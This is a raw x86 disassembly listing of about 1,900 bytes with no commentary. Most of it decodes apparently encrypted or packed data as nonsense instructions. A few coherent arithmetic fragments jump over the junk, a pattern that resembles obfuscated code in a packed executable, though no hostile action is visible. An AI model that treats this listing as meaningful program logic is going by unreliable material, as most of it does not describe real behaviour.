  40cfea:	rcl    DWORD PTR [ecx-0x75dcbf1e],1
  40cff0:	(bad)  
  40cff1:	xchg   esi,eax
  40cff2:	mov    DWORD PTR [ebp+ecx*1+0x17],esi
  40cff6:	inc    ebp
  40cff7:	pop    ebp
  40cff8:	aaa    
  40cff9:	(bad)  
  40cffa:	cdq    
  40cffb:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cffd:	pop    ds
  40cffe:	(bad)  
  40cfff:	pop    ecx
  40d000:	outs   dx,DWORD PTR ds:[esi]
  40d001:	jmp    0x40d024
  40d003:	pop    ds
  40d004:	ins    BYTE PTR es:[edi],dx
  40d005:	aaa    
  40d006:	cmp    DWORD PTR [eax+0x22],ebx
  40d009:	pop    edi
  40d00a:	rcl    WORD PTR [ebx+edx*2+0x75],1
  40d00f:	sub    BYTE PTR [edi+0x4a7d84c5],cl
  40d015:	jns    0x40cfbd
  40d017:	mov    cl,0xc7
  40d019:	call   0xf89e:0xe15255be
  40d020:	jge    0x40cfec
  40d022:	stos   DWORD PTR es:[edi],eax
  40d023:	cld    
  40d024:	fsubr  QWORD PTR [ecx]
  40d026:	fisub  DWORD PTR [eax]
  40d028:	(bad)  
  40d029:	dec    esi
  40d02a:	jecxz  0x40cfb3
  40d02c:	or     ch,0xba
  40d02f:	iret   
  40d030:	ret    0x4161
  40d033:	mov    ds:0x6f741941,eax
  40d038:	xchg   edi,eax
  40d039:	shl    DWORD PTR [ecx+0x5e],cl
  40d03c:	pop    edx
  40d03d:	xchg   esp,eax
  40d03e:	scas   al,BYTE PTR es:[edi]
  40d03f:	imul   ecx,DWORD PTR [esi],0xe8f5e5c4
  40d045:	out    0xf6,al
  40d047:	fldenv ds:0xaf39a56d
  40d04d:	mov    ds:0x78a055ae,eax
  40d052:	inc    edi
  40d053:	ds xchg esp,eax
  40d055:	pusha  
  40d056:	xchg   edx,eax
  40d057:	mov    esi,0xc7ad3d85
  40d05c:	mov    dh,0x64
  40d05e:	hlt    
  40d05f:	jmp    0x40d03e
  40d061:	inc    ebx
  40d062:	mov    eax,ds:0x7f40bd55
  40d067:	jp     0x40d071
  40d069:	call   0x5174:0xc5950065
  40d070:	cdq    
  40d071:	cmp    ebp,DWORD PTR gs:[edi+ecx*1]
  40d075:	test   DWORD PTR [edi],edi
  40d077:	or     eax,0x5a1280dc
  40d07c:	mov    esi,0x1f925bc3
  40d081:	sar    eax,0x59
  40d084:	test   al,0x86
  40d086:	jmp    0x80e2a83f
  40d08b:	jo     0x40d03c
  40d08d:	bswap  ecx
  40d08f:	mov    esi,DWORD PTR [eax+0x47c1807d]
  40d095:	sbb    BYTE PTR [ecx-0x31391afd],dh
  40d09b:	das    
  40d09c:	fisttp DWORD PTR ds:0xa97fa438
  40d0a2:	jb     0x40d02e
  40d0a4:	sbb    al,0x73
  40d0a6:	pusha  
  40d0a7:	ins    DWORD PTR es:[edi],dx
  40d0a8:	push   ebx
  40d0a9:	fild   QWORD PTR ds:0x16773b79
  40d0af:	shl    BYTE PTR [ecx+0xf46661f],cl
  40d0b5:	mov    WORD PTR [ecx+0x7bf5102d],ds
  40d0bb:	test   DWORD PTR [edi-0x78],eax
  40d0be:	and    ebx,DWORD PTR [esi-0x75]
  40d0c1:	inc    eax
  40d0c2:	ins    DWORD PTR es:[edi],dx
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ebp,FWORD PTR [ebx-0x4a]
  40d0f0:	out    0x91,eax
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d13a
  40d0fb:	mov    edx,0xd7f29fb7
  40d100:	and    DWORD PTR [ecx],esp
  40d102:	imul   esp,esp,0x1
  40d105:	mov    edi,0x83325309
  40d10a:	fsubr  st,st(1)
  40d10c:	or     eax,DWORD PTR [edi-0x2e6e4d5]
  40d112:	sbb    DWORD PTR [ecx],edx
  40d114:	sti    
  40d115:	inc    edx
  40d116:	retf   
  40d117:	adc    DWORD PTR [edx+0x3b869144],ebp
  40d11d:	cmc    
  40d11e:	bound  esi,QWORD PTR [esi+0x38]
  40d121:	ds mov edi,eax
  40d124:	into   
  40d125:	scas   eax,DWORD PTR es:[edi]
  40d126:	lock lds esi,FWORD PTR [ecx+edi*8+0x771151ea]
  40d12e:	outs   dx,DWORD PTR ds:[esi]
  40d12f:	(bad)  
  40d130:	dec    edx
  40d131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d132:	enter  0x3511,0xd7
  40d136:	inc    ebp
  40d137:	add    al,0xd1
  40d139:	lea    esp,[ebx-0x5bc950a9]
  40d13f:	xchg   ecx,eax
  40d140:	pop    edi
  40d141:	fdiv   st,st(0)
  40d143:	mov    bl,0x47
  40d145:	out    dx,al
  40d146:	jmp    0x8b58:0x1b54cac3
  40d14d:	mov    DWORD PTR [esi-0x334f7b90],ecx
  40d153:	int3   
  40d154:	inc    ebx
  40d155:	sbb    edx,eax
  40d157:	repz add eax,0x95d17f40
  40d15d:	push   eax
  40d15e:	retf   
  40d15f:	cmp    ebp,DWORD PTR [ebx-0x38feaaff]
  40d165:	ss and eax,0x64b78395
  40d16b:	pop    es
  40d16c:	jne    0x40d1be
  40d16e:	and    ch,BYTE PTR [edi+0x418ef6cc]
  40d174:	sbb    ah,dh
  40d176:	dec    esi
  40d177:	jae    0x40d1cd
  40d179:	iret   
  40d17a:	jae    0x40d11a
  40d17c:	mov    BYTE PTR [esi],dl
  40d17e:	mov    ecx,edi
  40d180:	jae    0x40d196
  40d182:	fnstcw WORD PTR [edi+0x659d46d3]
  40d188:	xchg   edx,eax
  40d189:	pop    ss
  40d18a:	push   ebx
  40d18b:	ficomp WORD PTR [ebx+eiz*1]
  40d18e:	lock das 
  40d190:	xchg   edx,eax
  40d191:	pushf  
  40d192:	inc    ecx
  40d193:	mov    ah,0x76
  40d195:	jg     0x40d161
  40d197:	sar    al,1
  40d199:	icebp  
  40d19a:	cmp    eax,0xcca298d4
  40d19f:	rcl    dh,cl
  40d1a1:	or     cl,BYTE PTR [edi]
  40d1a3:	jg     0x40d16d
  40d1a5:	pop    edi
  40d1a6:	xchg   edi,eax
  40d1a7:	sub    eax,0xb4d31e8
  40d1ac:	push   ds
  40d1ad:	cmc    
  40d1ae:	or     DWORD PTR [ebp-0x7c],edi
  40d1b1:	dec    esp
  40d1b2:	das    
  40d1b3:	mov    al,ds:0x6a25f301
  40d1b8:	dec    ebx
  40d1b9:	call   0xd22:0xfebb8522
  40d1c0:	nop
  40d1c1:	jb     0x40d1e3
  40d1c3:	push   0x6a8cad17
  40d1c8:	and    esi,edx
  40d1ca:	mov    ch,0x13
  40d1cc:	sbb    dl,bh
  40d1ce:	(bad)  
  40d1cf:	shl    ch,cl
  40d1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d2:	pop    ecx
  40d1d3:	lods   al,BYTE PTR ds:[esi]
  40d1d4:	std    
  40d1d5:	adc    al,0xfa
  40d1d7:	lds    edi,FWORD PTR [ebx]
  40d1d9:	lods   al,BYTE PTR ds:[esi]
  40d1da:	bound  edi,QWORD PTR ds:0xd72ae37c
  40d1e0:	jb     0x40d218
  40d1e2:	or     edx,DWORD PTR [ecx+0x16]
  40d1e5:	mov    al,0x12
  40d1e7:	push   cs
  40d1e8:	jno    0x40d21e
  40d1ea:	adc    DWORD PTR [esi-0x69ef3b6d],esi
  40d1f0:	leave  
  40d1f1:	mov    ds:0xaea849fd,eax
  40d1f6:	fist   WORD PTR [edx]
  40d1f8:	xlat   BYTE PTR ds:[ebx]
  40d1f9:	pop    edx
  40d1fa:	pop    ds
  40d1fb:	pop    es
  40d1fc:	jae    0x40d1b5
  40d1fe:	inc    edi
  40d1ff:	mov    ebp,0xc777aa1b
  40d204:	sbb    al,0xc8
  40d206:	cmp    BYTE PTR [eax-0x6fec3d7e],dl
  40d20c:	adc    eax,0x74a061ca
  40d211:	loope  0x40d262
  40d213:	and    eax,0x6c2b24cb
  40d218:	xor    al,0xa
  40d21a:	add    edi,ebp
  40d21c:	and    cl,BYTE PTR [ecx+0x6e12e698]
  40d222:	loop   0x40d1a9
  40d224:	das    
  40d225:	xlat   BYTE PTR ds:[ebx]
  40d226:	xchg   ebp,eax
  40d227:	mov    esp,0x1b14fe26
  40d22c:	(bad)  
  40d22d:	leave  
  40d22e:	mov    al,0x21
  40d230:	and    BYTE PTR [ebx+0x27],bl
  40d233:	sar    BYTE PTR [edx],0x1c
  40d236:	or     bh,BYTE PTR [edx-0x3d866bb2]
  40d23c:	ins    BYTE PTR es:[edi],dx
  40d23d:	repz icebp 
  40d23f:	cwde   
  40d240:	xchg   ebx,eax
  40d241:	mov    ds:0x16401373,al
  40d246:	nop
  40d247:	xor    eax,0xfabea023
  40d24c:	loope  0x40d266
  40d24e:	xor    DWORD PTR [esi+0x23983839],ecx
  40d254:	jg     0x40d1de
  40d256:	mov    bl,0xb7
  40d258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d259:	ins    BYTE PTR es:[edi],dx
  40d25a:	jl     0x40d1ed
  40d25c:	xor    dh,BYTE PTR [ecx]
  40d25e:	pusha  
  40d25f:	mov    ecx,ebx
  40d261:	in     al,0xed
  40d263:	mov    edx,0x9784856d
  40d268:	mov    WORD PTR [esi-0xaa41bff],?
  40d26e:	inc    edi
  40d26f:	loop   0x40d27e
  40d271:	in     al,dx
  40d272:	mov    eax,0xf99b9279
  40d277:	dec    ecx
  40d278:	or     BYTE PTR [ecx+0x469c797c],bl
  40d27e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d27f:	and    DWORD PTR [ecx],esp
  40d281:	and    al,0xce
  40d283:	inc    esp
  40d284:	xor    cl,BYTE PTR [esi-0x46]
  40d287:	call   0xed4:0xaeea712d
  40d28e:	enter  0xc82a,0xd9
  40d292:	cwde   
  40d293:	stos   DWORD PTR es:[edi],eax
  40d294:	lods   al,BYTE PTR ds:[esi]
  40d295:	sub    esi,esp
  40d297:	aas    
  40d298:	idiv   DWORD PTR [edx-0x17eebf61]
  40d29e:	mov    esp,0x9e722819
  40d2a3:	aam    0x1f
  40d2a5:	int    0x74
  40d2a7:	inc    edx
  40d2a8:	scas   al,BYTE PTR es:[edi]
  40d2a9:	mov    cl,bh
  40d2ab:	out    0x17,al
  40d2ad:	xchg   esi,eax
  40d2ae:	inc    esi
  40d2af:	dec    eax
  40d2b0:	cdq    
  40d2b1:	aam    0x6d
  40d2b3:	ins    BYTE PTR es:[edi],dx
  40d2b4:	jbe    0x40d273
  40d2b6:	sub    ebx,eax
  40d2b8:	mov    edi,0xffa7125f
  40d2bd:	fst    DWORD PTR [eax-0x53]
  40d2c0:	xchg   ebx,eax
  40d2c1:	mov    eax,ds:0xa834b7db
  40d2c6:	mov    ecx,0x405301c9
  40d2cb:	(bad)  
  40d2cc:	mov    ds:0x57c7584d,eax
  40d2d1:	cdq    
  40d2d2:	fadd   st,st(2)
  40d2d4:	popf   
  40d2d5:	fiadd  DWORD PTR [ecx]
  40d2d7:	scas   al,BYTE PTR es:[edi]
  40d2d8:	cmc    
  40d2d9:	(bad)  
  40d2da:	in     al,0x7e
  40d2dc:	jg     0x40d281
  40d2de:	jo     0x40d2c6
  40d2e0:	sbb    DWORD PTR ds:0x2c5c6045,ebp
  40d2e6:	(bad)  
  40d2e7:	cs loopne 0x40d331
  40d2ea:	test   al,0x14
  40d2ec:	lea    ecx,[ebx]
  40d2ee:	popf   
  40d2ef:	jmp    0x25d9:0x6c90652f
  40d2f6:	sub    ebp,eax
  40d2f8:	clc    
  40d2f9:	repnz adc eax,0xbf0ff83e
  40d2ff:	jb     0x40d2de
  40d301:	cmp    ch,BYTE PTR [eax]
  40d303:	iret   
  40d304:	mov    eax,0xc870bf99
  40d309:	fstp   TBYTE PTR fs:[ebx+ecx*8-0x6befa066]
  40d311:	sub    eax,0x968ece9e
  40d316:	ins    BYTE PTR es:[edi],dx
  40d317:	sub    cl,BYTE PTR [ecx]
  40d319:	dec    edi
  40d31a:	jno    0x40d2f3
  40d31c:	cli    
  40d31d:	xchg   DWORD PTR [ecx+0x4c],esp
  40d320:	icebp  
  40d321:	daa    
  40d322:	mov    eax,eax
  40d324:	and    ah,BYTE PTR [ebp+0x2069f2d]
  40d32a:	hlt    
  40d32b:	cli    
  40d32c:	ss ja  0x40d354
  40d32f:	fcomp  DWORD PTR [ebp+0x5b]
  40d332:	inc    ecx
  40d333:	loop   0x40d3ac
  40d335:	or     al,0xca
  40d337:	mul    DWORD PTR [esi-0x2843822c]
  40d33d:	(bad)  
  40d33e:	loopne 0x40d3bd
  40d340:	loopne 0x40d2ca
  40d342:	inc    ebp
  40d343:	pop    ds
  40d344:	call   0x9fee:0x90f50fc8
  40d34b:	jbe    0x40d397
  40d34d:	jge    0x40d2d0
  40d34f:	ret    
  40d350:	or     al,0x6d
  40d352:	xchg   DWORD PTR [edi+0x162b84dd],esi
  40d358:	xchg   BYTE PTR [ebx+esi*4+0x497b307f],cl
  40d35f:	jmp    0x7609:0x54e61327
  40d366:	fisub  DWORD PTR [eax+0x7c]
  40d369:	nop
  40d36a:	add    al,0x56
  40d36c:	mov    DWORD PTR [edx-0x37bec6b5],edx
  40d372:	dec    esi
  40d373:	cmp    esp,ebp
  40d375:	jge    0x40d323
  40d377:	les    ebp,FWORD PTR [ecx]
  40d379:	in     eax,dx
  40d37a:	cmp    eax,0x66df67a
  40d37f:	mov    fs,edx
  40d381:	(bad)  
  40d382:	sar    BYTE PTR [edx+0x1a],1
  40d385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d386:	sub    esp,eax
  40d388:	icebp  
  40d389:	xor    DWORD PTR [edx+0x778d0a31],0xd6cb7fdc
  40d393:	jb     0x40d32c
  40d395:	lock mov esp,0x915e7e01
  40d39b:	mov    esp,eax
  40d39d:	xchg   ebx,eax
  40d39e:	in     eax,0xb2
  40d3a0:	pop    ebp
  40d3a1:	push   edx
  40d3a2:	jecxz  0x40d39d
  40d3a4:	dec    ebx
  40d3a5:	out    0x9,al
  40d3a7:	in     eax,0x72
  40d3a9:	jecxz  0x40d3e5
  40d3ab:	into   
  40d3ac:	add    BYTE PTR [ecx-0x3ba2da74],ch
  40d3b2:	xchg   esp,eax
  40d3b3:	or     al,0xa4
  40d3b5:	xor    dh,BYTE PTR ds:0x25cdfb23
  40d3bb:	xor    bl,bl
  40d3bd:	enter  0xce7b,0x4f
  40d3c1:	das    
  40d3c2:	push   cs
  40d3c3:	pop    ebx
  40d3c4:	cmp    BYTE PTR [ecx+0x4f],dh
  40d3c7:	jmp    0xd6d8a481
  40d3cc:	enter  0x9abb,0x9e
  40d3d0:	int3   
  40d3d1:	into   
  40d3d2:	ja     0x40d422
  40d3d4:	jae    0x40d3db
  40d3d6:	test   BYTE PTR [ebx-0x783c6ac0],bh
  40d3dc:	jmp    0xf4067478
  40d3e1:	fisub  WORD PTR [esp+edi*4]
  40d3e4:	jae    0x40d3bd
  40d3e6:	xchg   ebp,eax
  40d3e7:	neg    DWORD PTR [ebx+0x71]
  40d3ea:	ror    DWORD PTR [edi+0x25a89beb],0x13
  40d3f1:	adc    eax,0x977bca9
  40d3f6:	fs test al,0xcf
  40d3f9:	es xchg ebp,eax
  40d3fb:	mov    bh,0xd2
  40d3fd:	pop    ds
  40d3fe:	cmp    ch,BYTE PTR [eax-0x25]
  40d401:	xchg   esi,eax
  40d402:	dec    edx
  40d403:	sub    BYTE PTR [eax+0x65],al
  40d406:	mov    dh,0x3d
  40d408:	ss add eax,0x2bec99ed
  40d40e:	mov    edx,DWORD PTR [edx-0x45cd4835]
  40d414:	adc    ch,bl
  40d416:	stos   BYTE PTR es:[edi],al
  40d417:	repz shl BYTE PTR [edx+0x6c14768],0xb0
  40d41f:	sub    edi,DWORD PTR [eax+0x4a]
  40d422:	cld    
  40d423:	js     0x40d414
  40d425:	ins    BYTE PTR es:[edi],dx
  40d426:	in     al,0x82
  40d428:	loop   0x40d3e1
  40d42a:	in     eax,dx
  40d42b:	int    0xb8
  40d42d:	shr    BYTE PTR [esi*1+0x631d4671],1
  40d434:	ret    
  40d435:	jns    0x40d485
  40d437:	sahf   
  40d438:	and    dl,BYTE PTR [edx]
  40d43a:	mov    al,ds:0xb362099d
  40d43f:	inc    esi
  40d440:	pop    eax
  40d441:	xchg   ecx,eax
  40d442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d443:	cmp    eax,0xc6b4ebee
  40d448:	xchg   edi,eax
  40d449:	push   ecx
  40d44a:	shl    BYTE PTR [edx],1
  40d44c:	add    eax,DWORD PTR [ecx]
  40d44e:	repnz push esi
  40d450:	sbb    DWORD PTR [eax-0x222d3e45],eax
  40d456:	mov    ebx,0xa65e4d93
  40d45b:	jmp    0x7a91a453
  40d460:	sbb    dh,BYTE PTR [edi+0x3a]
  40d463:	jne    0x40d461
  40d465:	jmp    0x40d43c
  40d467:	ja     0x40d46c
  40d469:	dec    ebx
  40d46a:	mov    bh,cl
  40d46c:	jp     0x40d40d
  40d46e:	enter  0x95c2,0x17
  40d472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d473:	sbb    eax,0xf18f446b
  40d478:	adc    BYTE PTR es:[edi-0x5a2b4c75],0x10
  40d480:	outs   dx,BYTE PTR ds:[esi]
  40d481:	add    BYTE PTR [eax-0x365a7506],dh
  40d487:	mov    bh,0x75
  40d489:	mov    cl,0x26
  40d48b:	and    cl,BYTE PTR [ecx]
  40d48d:	mov    al,ds:0xdbf3f663
  40d492:	es retf 
  40d494:	stos   DWORD PTR es:[edi],eax
  40d495:	add    dl,BYTE PTR [edx+ebp*1]
  40d498:	pop    edx
  40d499:	sbb    ebx,DWORD PTR [ebx+ecx*4-0x6b720783]
  40d4a0:	cmp    bl,BYTE PTR [edx+esi*2+0x55890032]
  40d4a7:	clc    
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x2bd3:0xb81a1d63
  40d4c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4c7:	in     al,dx
  40d4c8:	inc    ebx
  40d4c9:	leave  
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d548
  40d4d2:	mov    bh,0x3
  40d4d4:	xchg   ebp,eax
  40d4d5:	jae    0x40d4b2
  40d4d7:	imul   ebx,ebp,0x2f11d5cc
  40d4dd:	ins    BYTE PTR es:[edi],dx
  40d4de:	and    DWORD PTR ss:[eax+0x54],edx
  40d4e2:	xlat   BYTE PTR ds:[ebx]
  40d4e3:	mov    ecx,0x27c65db7
  40d4e8:	neg    DWORD PTR [edi-0x4c]
  40d4eb:	test   BYTE PTR [edi-0x7de18c0d],ah
  40d4f1:	mov    esp,0x6f84704c
  40d4f6:	or     DWORD PTR [eax+0x42bd5013],eax
  40d4fc:	loope  0x40d514
  40d4fe:	cdq    
  40d4ff:	sahf   
  40d500:	out    0xa6,eax
  40d502:	and    DWORD PTR [ecx-0x56],esi
  40d505:	arpl   WORD PTR [eax+0x3f],dx
  40d508:	icebp  
  40d509:	mov    ds:0xf80aed1a,eax
  40d50e:	sti    
  40d50f:	or     DWORD PTR [edi-0x77],0xffffffc8
  40d513:	iret   
  40d514:	pop    ebx
  40d515:	dec    ecx
  40d516:	stos   DWORD PTR es:[edi],eax
  40d517:	or     eax,DWORD PTR [edi+ebp*2-0x42bd5a2f]
  40d51e:	sub    al,0x73
  40d520:	mov    fs,WORD PTR [ecx]
  40d522:	test   BYTE PTR [ebx],0xe3
  40d525:	jmp    0xe852:0x8d4ed8ed
  40d52c:	(bad)  
  40d52e:	test   eax,0x241521d8
  40d533:	jecxz  0x40d534
  40d535:	sbb    DWORD PTR [esi],0x80149a29
  40d53b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d53c:	xchg   ebp,eax
  40d53d:	lods   eax,DWORD PTR ds:[esi]
  40d53e:	int3   
  40d53f:	ret    0x80e5
  40d542:	adc    ebx,edi
  40d544:	retf   
  40d545:	ins    DWORD PTR es:[edi],dx
  40d546:	and    eax,0x10758af5
  40d54b:	cwde   
  40d54c:	mov    dh,0x6d
  40d54e:	adc    eax,0xeb52f1b6
  40d553:	iret   
  40d554:	xor    bx,WORD PTR [edx-0x16e2c1a0]
  40d55b:	in     al,dx
  40d55c:	xchg   ebp,eax
  40d55d:	clc    
  40d55e:	mov    esi,0x43920d10
  40d563:	cli    
  40d564:	outs   dx,BYTE PTR ds:[esi]
  40d565:	fist   WORD PTR [esi+0x13]
  40d568:	(bad)  
  40d569:	jmp    FWORD PTR ds:0xa4d6d9ef
  40d56f:	sub    eax,0xd8cb3c6e
  40d574:	or     eax,0x9c80374a
  40d579:	mov    BYTE PTR [eax],bl
  40d57b:	jns    0x40d50d
  40d57d:	push   es
  40d57e:	push   edx
  40d57f:	cmp    bl,dh
  40d581:	mov    al,0x24
  40d583:	add    al,0x3c
  40d585:	mov    edi,ebx
  40d587:	or     ebp,DWORD PTR [edi]
  40d589:	ds (bad) 
  40d58b:	xchg   edi,eax
  40d58c:	xchg   ebx,eax
  40d58d:	jecxz  0x40d527
  40d58f:	jns    0x40d5be
  40d591:	js     0x40d610
  40d593:	xchg   ebp,eax
  40d594:	popf   
  40d595:	pusha  
  40d596:	sbb    eax,0xfb94b6a5
  40d59b:	out    dx,al
  40d59c:	sub    eax,0x4a54d38d
  40d5a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5a2:	hlt    
  40d5a3:	xor    al,0xb7
  40d5a5:	mov    ?,WORD PTR [edx]
  40d5a7:	mul    al
  40d5a9:	lods   al,BYTE PTR ds:[esi]
  40d5ab:	sbb    bh,BYTE PTR [edx+0x1eb84e68]
  40d5b1:	pop    ebx
  40d5b2:	mov    ch,0xf4
  40d5b4:	sbb    ebp,eax
  40d5b6:	or     al,ch
  40d5b8:	xor    al,dh
  40d5ba:	dec    esp
  40d5bb:	add    al,0xa3
  40d5bd:	stos   DWORD PTR es:[edi],eax
  40d5be:	pop    ds
  40d5bf:	rcl    DWORD PTR [edx-0x6b88357],1
  40d5c5:	inc    edi
  40d5c6:	loope  0x40d56b
  40d5c8:	mov    al,0x74
  40d5ca:	sub    al,0xdd
  40d5cc:	adc    edi,edx
  40d5ce:	jecxz  0x40d623
  40d5d0:	(bad)  
  40d5d1:	or     eax,0x2a3e1270
  40d5d6:	sub    dl,BYTE PTR [edi]
  40d5d8:	test   cl,0x15
  40d5db:	mov    al,dh
  40d5dd:	test   al,0xe1
  40d5df:	mov    eax,ds:0x9f19f240
  40d5e4:	push   0xffffffe0
  40d5e6:	mov    ebx,0x2c125841
  40d5eb:	cld    
  40d5ec:	pop    ss
  40d5ed:	adc    BYTE PTR [edi+0x46671872],al
  40d5f3:	mov    ebp,0x467ccea7
  40d5f8:	adc    eax,0xefc75881
  40d5fd:	cmp    al,0x9a
  40d5ff:	jae    0x40d632
  40d601:	outs   dx,BYTE PTR ds:[esi]
  40d602:	and    dl,BYTE PTR [ebx+0x59eb8e97]
  40d608:	aas    
  40d609:	mov    ds:0xbb16e130,al
  40d60e:	test   DWORD PTR [ebp+0x1f],0x82ce16dc
  40d615:	loop   0x40d5f0
  40d617:	jb     0x40d66a
  40d619:	test   BYTE PTR [esi],al
  40d61b:	cmp    BYTE PTR [ecx+0x55fb8eb5],bh
  40d621:	sub    DWORD PTR [edx],edi
  40d623:	aad    0x7a
  40d625:	int    0x5
  40d627:	xor    dh,BYTE PTR ds:0xe2e36abd
  40d62d:	and    DWORD PTR [ebx-0x4c],0x149a326b
  40d634:	lds    ecx,FWORD PTR [edx]
  40d636:	xchg   ebx,eax
  40d637:	xchg   ebx,eax
  40d638:	and    DWORD PTR [edi-0x44],edi
  40d63b:	les    ecx,FWORD PTR [ebx+0x7c9dd881]
  40d641:	(bad)  
  40d642:	lods   eax,DWORD PTR ds:[esi]
  40d643:	hlt    
  40d644:	out    dx,al
  40d645:	(bad)  
  40d646:	lock mov esi,0x309b1b40
  40d64c:	xchg   DWORD PTR [ebx-0x28],ecx
  40d64f:	ds jmp 0x23ec:0x656c1618
  40d657:	and    BYTE PTR [edi-0x26],ah
  40d65a:	imul   DWORD PTR [edx+ecx*8]
  40d65d:	inc    ebp
  40d65e:	jmp    0xf1de5cc7
  40d663:	packuswb mm5,QWORD PTR [ebx+0x5b224d5f]
  40d66a:	mov    ebx,0x6f1a4f38
  40d66f:	in     al,0xc0
  40d671:	lods   al,BYTE PTR ds:[esi]
  40d672:	and    eax,0xaa1743c1
  40d677:	push   ebp
  40d678:	push   edx
  40d679:	stos   DWORD PTR es:[edi],eax
  40d67a:	ja     0x40d602
  40d67c:	inc    edi
  40d67d:	ret    0xc5d1
  40d680:	stc    
  40d681:	mov    esi,0x4b0fd35f
  40d686:	jns    0x40d6d9
  40d688:	or     BYTE PTR [edi-0x1b],dh
  40d68b:	sub    BYTE PTR [eax],ch
  40d68d:	ins    BYTE PTR es:[edi],dx
  40d68e:	jnp    0x40d667
  40d690:	cmp    eax,0x8bf87530
  40d695:	sbb    bh,BYTE PTR [ebp+0x3f9d070e]
  40d69b:	shl    DWORD PTR [esi-0x5e],1
  40d69e:	cmp    eax,0x60d44157
  40d6a3:	in     eax,0xd6
  40d6a5:	cmp    DWORD PTR [edi],ebx
  40d6a7:	test   bl,dl
  40d6a9:	push   ecx
  40d6aa:	mov    eax,ds:0x8586f305
  40d6af:	sub    eax,0xc5aa524a
  40d6b4:	ins    BYTE PTR es:[edi],dx
  40d6b5:	push   edi
  40d6b6:	cmc    
  40d6b7:	fs in  al,dx
  40d6b9:	int3   
  40d6ba:	add    ecx,ebp
  40d6bc:	popa   
  40d6bd:	mov    ds:0x623a3327,al
  40d6c2:	jb     0x40d677
  40d6c4:	in     al,0x11
  40d6c6:	xor    ah,BYTE PTR [ebp+0x9]
  40d6c9:	pushf  
  40d6ca:	out    dx,eax
  40d6cb:	ins    DWORD PTR es:[edi],dx
  40d6cc:	shl    DWORD PTR [eax+0x3a834d5e],0x4b
  40d6d3:	cmc    
  40d6d4:	stos   DWORD PTR es:[edi],eax
  40d6d5:	xor    al,0x5b
  40d6d7:	add    al,0x4f
  40d6d9:	dec    edi
  40d6da:	xchg   ebx,eax
  40d6db:	scas   al,BYTE PTR es:[edi]
  40d6dc:	leave  
  40d6dd:	dec    esi
  40d6de:	xlat   BYTE PTR ds:[ebx]
  40d6df:	imul   eax,DWORD PTR [ebx+0x275289c6],0x57d31804
  40d6e9:	mov    ecx,0x285e8c8f
  40d6ee:	jns    0x40d6a7
  40d6f0:	xchg   edi,eax
  40d6f1:	inc    ecx
  40d6f2:	loope  0x40d75f
  40d6f4:	adc    BYTE PTR [edi],0x7b
  40d6f7:	cmp    ebx,edx
  40d6f9:	dec    ebp
  40d6fa:	dec    esp
  40d6fb:	sbb    DWORD PTR [ebx],ecx
  40d6fd:	dec    edi
  40d6fe:	out    0xd1,eax
  40d700:	hlt    
  40d701:	popf   
  40d702:	jl     0x40d765
  40d704:	pop    ebp
  40d705:	loopne 0x40d759
  40d707:	sbb    ecx,DWORD PTR [ebx+0x1da8bfce]
  40d70d:	mov    ch,0x7d
  40d70f:	jecxz  0x40d715
  40d711:	push   cs
  40d712:	icebp  
  40d713:	xor    dh,BYTE PTR ds:0xceb31244
  40d719:	sub    eax,esp
  40d71b:	out    0xb1,al
  40d71d:	aas    
  40d71e:	and    bl,BYTE PTR [esi+ecx*8]
  40d721:	out    dx,al
  40d722:	ins    BYTE PTR es:[edi],dx
  40d723:	inc    esp
  40d724:	loop   0x40d77d
  40d726:	adc    BYTE PTR [ebp+0x7c85560c],al
  40d72c:	mov    esp,0x46ef585e
  40d731:	mov    ds,WORD PTR [esi]
  40d733:	push   0xb5930836
  40d738:	jge    0x40d70b
  40d73a:	test   dh,dl
  40d73c:	js     0x40d6d7
  40d73e:	mov    ds:0x4f900d88,eax
  40d743:	push   ss
  40d744:	push   es
  40d745:	out    0x92,eax
  40d747:	int3   
  40d748:	ins    BYTE PTR es:[edi],dx
  40d749:	or     ebp,ebx
  40d74b:	xchg   edi,eax
  40d74c:	rol    BYTE PTR [ecx+esi*2-0x3dde24b],1
  40d753:	shr    DWORD PTR [eax-0x67],0xad
  40d757:	cmp    eax,DWORD PTR [ebp+0x60689be8]
  40d75d:	sub    dh,BYTE PTR [edi+0x6ac7bee9]
  40d763:	enter  0xef9d,0xd9
  40d767:	mov    dh,0x57
  40d769:	jbe    0x40d7aa
  40d76b:	ss mov ebp,0x9d51661a
  40d771:	std    
  40d772:	or     ecx,DWORD PTR [ecx-0x93bd007]
  40d778:	mov    ebp,0x8aadac5c
